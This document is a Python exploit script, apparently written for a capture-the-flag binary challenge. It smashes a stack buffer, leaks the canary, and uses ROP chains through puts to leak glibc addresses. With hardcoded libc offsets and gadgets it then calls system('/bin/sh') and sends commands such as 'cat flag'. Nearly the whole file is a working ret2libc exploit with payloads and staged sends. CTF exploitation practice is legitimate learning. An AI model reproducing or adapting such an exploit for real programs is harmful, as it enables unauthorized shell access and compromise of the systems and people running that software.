#!/usr/bin/env python3

#if sploit is called with command line arguments,
#it will use them to call the target program with popen
#otherwise, sploit will use stdin/stdout
#you can use sploitpipe to run sploit with pipes spltin/spltout
#which can be used with the target program
#<spltin ./target &>spltout
#or from within gdb
#r <spltin &>spltout
#if given a program name on the command line, we'll use popen
#otherwise, we use stdin/stdout
#in the latter case, you can use sploitpipe to set up spltin and spltout

import time

import sploitutil as util
import sploitrunner

#specify which glibc offsets to use
testing = True

#puts,system,and binsh string offsets into glibc
#https://libc.blukat.me/
#https://libc.rip/
#search two functions and the least significant 12 bits of their address
#then use the resulting glibc to get offsets for the exploit
#for whatever reason, some of these are off by a small amount
#printing the contents out(even bytes of instructions)
#and comparing to what I expect in gdb has been enough to figure it out
#also, if we have the actual library
#objdump -T libc.so | grep '_puts'
#xxd libc.so | grep '/bin'

#my kali glibc (puts:0x5f0,setvbuf:0xcd0)
#https://libc.blukat.me/?q=_IO_puts%3A5f0%2C_IO_setvbuf%3Acd0
#libc6_2.31-9_amd64
#str_bin_sh was off for this one. I had to subtract 0x04 to get it right
libc_offset = util.itob(0x0765f0)
libc_system = util.itob(0x048e50)
libc_execve = util.itob(0x0cb6c0)
libc_exit = util.itob(0x0cb670)
libc_binsh = util.itob(0x18a152)
libc_poprdx_poprbx = util.itob(0x1376e2)
#target glibc (puts:0x5a0,setvbuf:0xe60)
#https://libc.blukat.me/?q=_IO_puts%3A5a0%2C_IO_setvbuf%3Ae60
#libc6_2.31-0ubuntu9.2_amd64 (3 listed, but all I care about was the same)
if not testing:
    libc_offset = util.itob(0x0875a0)
    libc_system = util.itob(0x055410)
    libc_execve = util.itob(0x0e62f0)
    libc_exit = util.itob(0x0e6290)
    libc_binsh = util.itob(0x1b75aa)
    libc_poprdx_poprbx = util.itob(0x162866)

frame_len = 0x108

string = b'Hello, World!\n'

shellcode = b'\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff'+string

payloads = {
        'null' : util.itob(0x00),
        #stack smash
        'fill' : b'A'*(frame_len),
        'string' : string+b'A'*(frame_len-len(string)),
        'shellcode' : b'\x90'*(frame_len-len(shellcode))+shellcode,
        'canary' : util.itob(0xdeadbeef),
        #stack addresses
        'buffaddr' : util.itob(0x7fffffff0000),
        #static addresses
        'startaddr' : util.itob(0x4005d0),
        'targetaddr' : util.itob(0x400725),
        'pltaddr' : util.itob(0x4005c0),
        'gotaddr' : util.itob(0x600fe8),
        'gotaddr2' : util.itob(0x601030),
        #rop gadgets
        'ret' : util.itob(0x400801),
        'poprdi' : util.itob(0x400873),
        'poprsi_popr15' : util.itob(0x400871)
}


def sploit(stdin, stdout):
    c = util.Communication(stdin,stdout)

    def preamble():
        #preamble
        c.recv()
        #smash the stack up to canary
        #+ a newline to overwrite the null and delimit the next two readlines
        c.send(  payloads['fill']
                +b'\n')
        #most of the echo
        c.recv()
        #get the canary from the echo
        out = c.recv()
        canary = b'\x00'+out[:7]
        return canary

    #rop to find the address of setvbuf in memory
    #for the purpose of looking up the glibc offsets in a database
    canary = preamble()
    ropchain = payloads['poprdi'] #pop rdi,ret
    ropchain += payloads['gotaddr2'] #rdi; pointer to setvbuf.got
    ropchain += payloads['pltaddr'] #ret puts
    #rop to find the address of puts in memory
    #for the purpose of looking up the glibc offsets in a database
    #and then we will use this to calculate our glibc base at runtime
    ropchain += payloads['poprdi'] #pop rdi,ret
    ropchain += payloads['gotaddr'] #rdi; pointer to puts.got
    ropchain += payloads['pltaddr'] #ret puts
    ropchain += payloads['startaddr'] #ret _start to fix stack
    #smash stack again, but with canary and rop
    #this will print out the address of puts in memory
    c.send(  payloads['fill']
            +canary
            +payloads['buffaddr']
            +ropchain)

    #get the glibc puts address
    c.recv()
    out = c.recv()
    libc_addr = out[:8]
    #if puts() terminated on a \x00 (like the most sig bits of an address)
    #our [:8] might get less than 8 bytes of address + a newline
    #so strip that newline
    if libc_addr[-1:] == b'\n':
        libc_addr = libc_addr[:-1]
    #calculate glibc base address
    libc = util.Libc(libc_addr,libc_offset)
    libc_base = libc.base()
    #use that to calculate other glibc addresses
    system_addr = libc.addr(libc_system)
    execve_addr = libc.addr(libc_execve)
    exit_addr = libc.addr(libc_exit)
    binsh_addr = libc.addr(libc_binsh)
    poprdx_poprbx_addr = libc.addr(libc_poprdx_poprbx)

    canary = preamble()
    #print first few bytes of glibc
    #this is to validate our offset
    #a proper ELF file starts with '\x7fELF'
    ropchain = payloads['poprdi'] #pop rdi,ret
    ropchain += libc_base #rdi; pointer to glibc
    ropchain += payloads['pltaddr'] #ret puts
    #rop to puts("/bin/sh")
    #this is to validate our offset
    ropchain += payloads['poprdi'] #pop rdi,ret
    ropchain += binsh_addr #rdi; pointer to "/bin/sh"
    ropchain += payloads['pltaddr'] #ret puts
    ropchain += payloads['startaddr'] #ret _start
    c.send(  payloads['fill']
            +canary
            +payloads['buffaddr']
            +ropchain)
    c.recv()
    c.recv()

    #rop to execve("/bin/sh",0,0)
    #canary = preamble()
    #ropchain = payloads['poprdi'] #pop rdi,ret
    #ropchain += binsh_addr #rdi; pointer to "/bin/sh"
    #ropchain += payloads['poprsi_popr15'] #pop rsi,pop r15,ret
    #ropchain += payloads['null'] #rsi
    #ropchain += payloads['null'] #r15
    #ropchain += poprdx_poprbx_addr #pop rdx,pop rbx,ret
    #ropchain += payloads['null'] #rdx
    #ropchain += payloads['null'] #rbx
    #ropchain += execve_addr #ret execve
    #ropchain += payloads['poprdi'] #pop rdi,ret
    #ropchain += payloads['null'] #rdi 0
    #ropchain += exit_addr #ret exit to exit cleanly

    #rop to system("/bin/sh")
    canary = preamble()
    ropchain = payloads['poprdi'] #pop rdi,ret
    ropchain += binsh_addr #rdi; pointer to "/bin/sh"
    ropchain += payloads['ret'] #extra ret for 16byte stack alignment
    ropchain += system_addr #ret system
    ropchain += payloads['poprdi'] #pop rdi,ret
    ropchain += payloads['null'] #rdi 0
    ropchain += exit_addr #ret exit to exit cleanly
    c.send(  payloads['fill']
            +canary
            +payloads['buffaddr']
            +ropchain)

    #we need to synchronize when read() finishes before sending more data
    #we could insert another puts() into the rop and call c.recv()
    #or we can just sleep for a second
    time.sleep(1)

    #try some shell commands
    c.send(b'whoami\n')
    c.send(b'pwd\n')
    c.send(b'ls\n')
    c.send(b'cat flag\n')
    c.send(b'cat flag.txt\n')
    c.send(b'exit\n')

    return

#run our sploit
sploitrunner.runsploit(sploit)
